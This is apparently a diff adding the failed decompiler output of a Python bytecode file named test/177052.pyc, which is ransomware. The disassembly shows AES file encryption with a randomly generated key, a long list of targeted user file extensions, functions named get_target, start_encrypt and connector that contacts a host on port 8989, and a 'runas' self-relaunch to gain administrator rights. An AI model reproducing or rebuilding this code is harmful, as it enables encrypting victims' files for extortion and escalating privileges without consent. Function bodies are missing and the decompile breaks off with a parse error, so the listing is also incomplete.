@@ -1,0 +1,255 @@
+
+# file test/177052.pyc
+# --- This code section failed: ---
+
+ L.   1         0  LOAD_CONST               0
+                2  LOAD_CONST               None
+                4  IMPORT_NAME              os
+                6  STORE_NAME               os
+                8  LOAD_CONST               0
+               10  LOAD_CONST               None
+               12  IMPORT_NAME              sys
+               14  STORE_NAME               sys
+               16  LOAD_CONST               0
+               18  LOAD_CONST               None
+               20  IMPORT_NAME              socket
+               22  STORE_NAME               socket
+               24  LOAD_CONST               0
+               26  LOAD_CONST               None
+               28  IMPORT_NAME              string
+               30  STORE_NAME               string
+               32  LOAD_CONST               0
+               34  LOAD_CONST               None
+               36  IMPORT_NAME              random
+               38  STORE_NAME               random
+               40  LOAD_CONST               0
+               42  LOAD_CONST               None
+               44  IMPORT_NAME              hashlib
+               46  STORE_NAME               hashlib
+               48  LOAD_CONST               0
+               50  LOAD_CONST               None
+               52  IMPORT_NAME              getpass
+               54  STORE_NAME               getpass
+               56  LOAD_CONST               0
+               58  LOAD_CONST               None
+               60  IMPORT_NAME              platform
+               62  STORE_NAME               platform
+               64  LOAD_CONST               0
+               66  LOAD_CONST               None
+               68  IMPORT_NAME              threading
+               70  STORE_NAME               threading
+               72  LOAD_CONST               0
+               74  LOAD_CONST               None
+               76  IMPORT_NAME              datetime
+               78  STORE_NAME               datetime
+               80  LOAD_CONST               0
+               82  LOAD_CONST               None
+               84  IMPORT_NAME              time
+               86  STORE_NAME               time
+               88  LOAD_CONST               0
+               90  LOAD_CONST               None
+               92  IMPORT_NAME              base64
+               94  STORE_NAME               base64
+
+ L.   3        96  LOAD_CONST               0
+               98  LOAD_CONST               ('Path',)
+              100  IMPORT_NAME              pathlib
+              102  IMPORT_FROM              Path
+              104  STORE_NAME               Path
+              106  POP_TOP          
+
+ L.   6       108  LOAD_CONST               0
+              110  LOAD_CONST               None
+              112  IMPORT_NAME              ctypes
+              114  STORE_NAME               ctypes
+
+ L.   8       116  LOAD_CONST               0
+              118  LOAD_CONST               ('Random',)
+              120  IMPORT_NAME              Crypto
+              122  IMPORT_FROM              Random
+              124  STORE_NAME               Random
+              126  POP_TOP          
+
+ L.   9       128  LOAD_CONST               0
+              130  LOAD_CONST               ('AES',)
+              132  IMPORT_NAME_ATTR         Crypto.Cipher
+              134  IMPORT_FROM              AES
+              136  STORE_NAME               AES
+              138  POP_TOP          
+
+ L.  13       140  LOAD_CODE                <code_object getlocalip>
+              142  LOAD_STR                 'getlocalip'
+              144  MAKE_FUNCTION_0          'Neither defaults, keyword-only args, annotations, nor closures'
+              146  STORE_NAME               getlocalip
+
+ L.  18       148  LOAD_CONST               64
+              150  LOAD_NAME                string
+              152  LOAD_ATTR                ascii_uppercase
+              154  LOAD_NAME                string
+              156  LOAD_ATTR                digits
+              158  BINARY_ADD       
+              160  BUILD_TUPLE_2         2 
+              162  LOAD_CODE                <code_object gen_string>
+              164  LOAD_STR                 'gen_string'
+              166  MAKE_FUNCTION_1          'default'
+              168  STORE_NAME               gen_string
+
+ L.  22       170  LOAD_CODE                <code_object pad>
+              172  LOAD_STR                 'pad'
+              174  MAKE_FUNCTION_0          'Neither defaults, keyword-only args, annotations, nor closures'
+              176  STORE_NAME               pad
+
+ L.  25       178  LOAD_CONST               (256,)
+              180  LOAD_CODE                <code_object encrypt>
+              182  LOAD_STR                 'encrypt'
+              184  MAKE_FUNCTION_1          'default'
+              186  STORE_NAME               encrypt
+
+ L.  31       188  LOAD_CODE                <code_object encrypt_file>
+              190  LOAD_STR                 'encrypt_file'
+              192  MAKE_FUNCTION_0          'Neither defaults, keyword-only args, annotations, nor closures'
+              194  STORE_NAME               encrypt_file
+
+ L.  43       196  LOAD_STR                 '127.0.0.1'
+              198  STORE_NAME               host
+
+ L.  44       200  LOAD_CONST               8989
+              202  STORE_NAME               port
+
+ L.  46       204  LOAD_NAME                hashlib
+              206  LOAD_METHOD              md5
+              208  LOAD_NAME                gen_string
+              210  CALL_FUNCTION_0       0  ''
+              212  LOAD_METHOD              encode
+              214  LOAD_STR                 'utf-8'
+              216  CALL_METHOD_1         1  ''
+              218  CALL_METHOD_1         1  ''
+              220  LOAD_METHOD              hexdigest
+              222  CALL_METHOD_0         0  ''
+              224  STORE_NAME               key
+
+ L.  47       226  LOAD_NAME                key
+              228  LOAD_METHOD              encode
+              230  LOAD_STR                 'utf-8'
+              232  CALL_METHOD_1         1  ''
+              234  STORE_NAME               key
+
+ L.  51       236  LOAD_NAME                platform
+              238  LOAD_METHOD              system
+              240  CALL_METHOD_0         0  ''
+              242  STORE_GLOBAL             os_platform
+
+ L.  52       244  LOAD_NAME                platform
+              246  LOAD_METHOD              node
+              248  CALL_METHOD_0         0  ''
+              250  STORE_NAME               hostname
+
+ L.  55       252  BUILD_LIST_0          0 
+              254  LOAD_CONST               ('.jpg', '.jpeg', '.bmp', '.gif', '.png', '.svg', '.psd', '.raw', '.tiff', '.tif', '.sraw', '.nef', '.mp3', '.mp4', '.m4a', '.aac', '.ogg', '.flac', '.wav', '.wma', '.aiff', '.ape', '.avi', '.flv', '.m4v', '.mkv', '.mov', '.mpg', '.mpeg', '.wmv', '.swf', '.3gp', '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx', '.odt', '.odp', '.ods', '.txt', '.rtf', '.tex', '.pdf', '.epub', '.md', '.yml', '.yaml', '.json', '.xml', '.csv', '.db', '.sql', '.dbf', '.mdb', '.iso', '.html', '.htm', '.xhtml', '.php', '.asp', '.aspx', '.js', '.jsp', '.css', '.c', '.cpp', '.cxx', '.h', '.hpp', '.hxx', '.java', '.class', '.jar', '.ps', '.bat', '.vb', '.awk', '.sh', '.cgi', '.pl', '.ada', '.swift', '.go', '.py', '.pyc', '.bf', '.coffee', '.zip', '.tar', '.tgz', '.bz2', '.7z', '.rar', '.bak', '.cfu', '.cf', '.xsd', '.php', '.ovl', '.cfe', '.dt', '.epf', '.erf', '.1cd', '.3ds', '.sat', '.ipt', '.iam', '.model', '.session', '.exp', '.dlv3', '.dgn', '.dxb', '.iges', '.asm', '.neu', '.dae', '.fbx', '.dxf', '.obj', '.lwo', '.svg', '.ply', '.stl', '.vrm', '.log')
+              256  CALL_FINALLY        259  'to 259'
+              258  STORE_NAME               ext
+
+ L. 186       260  LOAD_CODE                <code_object get_target>
+              262  LOAD_STR                 'get_target'
+              264  MAKE_FUNCTION_0          'Neither defaults, keyword-only args, annotations, nor closures'
+              266  STORE_NAME               get_target
+
+ L. 190       268  LOAD_CODE                <code_object start_encrypt>
+              270  LOAD_STR                 'start_encrypt'
+              272  MAKE_FUNCTION_0          'Neither defaults, keyword-only args, annotations, nor closures'
+              274  STORE_NAME               start_encrypt
+
+ L. 253       276  LOAD_NAME                str
+              278  LOAD_NAME                key
+              280  LOAD_CONST               None
+              282  LOAD_CONST               None
+              284  LOAD_CONST               -1
+              286  BUILD_SLICE_3         3 
+              288  BINARY_SUBSCR    
+              290  CALL_FUNCTION_1       1  ''
+              292  STORE_NAME               nit
+
+ L. 254       294  LOAD_STR                 "'as"
+              296  LOAD_NAME                str
+              298  LOAD_NAME                random
+              300  LOAD_METHOD              randint
+              302  LOAD_CONST               32
+              304  LOAD_CONST               6561
+              306  CALL_METHOD_2         2  ''
+              308  CALL_FUNCTION_1       1  ''
+              310  BINARY_ADD       
+              312  LOAD_STR                 "t'0fd4"
+              314  BINARY_ADD       
+              316  LOAD_NAME                nit
+              318  BINARY_ADD       
+              320  STORE_NAME               mgs
+
+ L. 255       322  LOAD_CODE                <code_object connector>
+              324  LOAD_STR                 'connector'
+              326  MAKE_FUNCTION_0          'Neither defaults, keyword-only args, annotations, nor closures'
+              328  STORE_NAME               connector
+
+ L. 275       330  LOAD_CODE                <code_object is_admin>
+              332  LOAD_STR                 'is_admin'
+              334  MAKE_FUNCTION_0          'Neither defaults, keyword-only args, annotations, nor closures'
+              336  STORE_NAME               is_admin
+
+ L. 282       338  LOAD_NAME                is_admin
+              340  CALL_FUNCTION_0       0  ''
+          342_344  POP_JUMP_IF_FALSE   390  'to 390'
+
+ L. 283       346  SETUP_FINALLY       358  'to 358'
+
+ L. 284       348  LOAD_NAME                connector
+              350  CALL_FUNCTION_0       0  ''
+              352  POP_TOP          
+              354  POP_BLOCK        
+              356  JUMP_FORWARD        388  'to 388'
+            358_0  COME_FROM_FINALLY   346  '346'
+
+ L. 285       358  DUP_TOP          
+              360  LOAD_NAME                KeyboardInterrupt
+          362_364  <121>               386  ''
+              366  POP_TOP          
+              368  POP_TOP          
+              370  POP_TOP          
+
+ L. 286       372  LOAD_NAME                sys
+              374  LOAD_METHOD              exit
+              376  LOAD_CONST               0
+              378  CALL_METHOD_1         1  ''
+              380  POP_TOP          
+              382  POP_EXCEPT       
+              384  JUMP_FORWARD        388  'to 388'
+              386  <48>             
+            388_0  COME_FROM           384  '384'
+            388_1  COME_FROM           356  '356'
+              388  JUMP_FORWARD        416  'to 416'
+            390_0  COME_FROM           342  '342'
+
+ L. 288       390  LOAD_NAME                ctypes
+              392  LOAD_ATTR                windll
+              394  LOAD_ATTR                shell32
+              396  LOAD_METHOD              ShellExecuteW
+              398  LOAD_CONST               None
+              400  LOAD_STR                 'runas'
+              402  LOAD_NAME                sys
+              404  LOAD_ATTR                executable
+              406  LOAD_NAME                __file__
+              408  LOAD_CONST               None
+              410  LOAD_CONST               1
+              412  CALL_METHOD_6         6  ''
+              414  POP_TOP          
+            416_0  COME_FROM           388  '388'
+
+Parse error at or near `CALL_FINALLY' instruction at offset 256
+
+Instruction context:
+   
+ L.  55       252  BUILD_LIST_0          0 
+                 254  LOAD_CONST               ('.jpg', '.jpeg', '.bmp', '.gif', '.png', '.svg', '.psd', '.raw', '.tiff', '.tif', '.sraw', '.nef', '.mp3', '.mp4', '.m4a', '.aac', '.ogg', '.flac', '.wav', '.wma', '.aiff', '.ape', '.avi', '.flv', '.m4v', '.mkv', '.mov', '.mpg', '.mpeg', '.wmv', '.swf', '.3gp', '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx', '.odt', '.odp', '.ods', '.txt', '.rtf', '.tex', '.pdf', '.epub', '.md', '.yml', '.yaml', '.json', '.xml', '.csv', '.db', '.sql', '.dbf', '.mdb', '.iso', '.html', '.htm', '.xhtml', '.php', '.asp', '.aspx', '.js', '.jsp', '.css', '.c', '.cpp', '.cxx', '.h', '.hpp', '.hxx', '.java', '.class', '.jar', '.ps', '.bat', '.vb', '.awk', '.sh', '.cgi', '.pl', '.ada', '.swift', '.go', '.py', '.pyc', '.bf', '.coffee', '.zip', '.tar', '.tgz', '.bz2', '.7z', '.rar', '.bak', '.cfu', '.cf', '.xsd', '.php', '.ovl', '.cfe', '.dt', '.epf', '.erf', '.1cd', '.3ds', '.sat', '.ipt', '.iam', '.model', '.session', '.exp', '.dlv3', '.dgn', '.dxb', '.iges', '.asm', '.neu', '.dae', '.fbx', '.dxf', '.obj', '.lwo', '.svg', '.ply', '.stl', '.vrm', '.log')
+->               256  CALL_FINALLY        259  'to 259'
+                 258  STORE_NAME               ext
+
+test/177052.pyc -- 
+# decompile failed
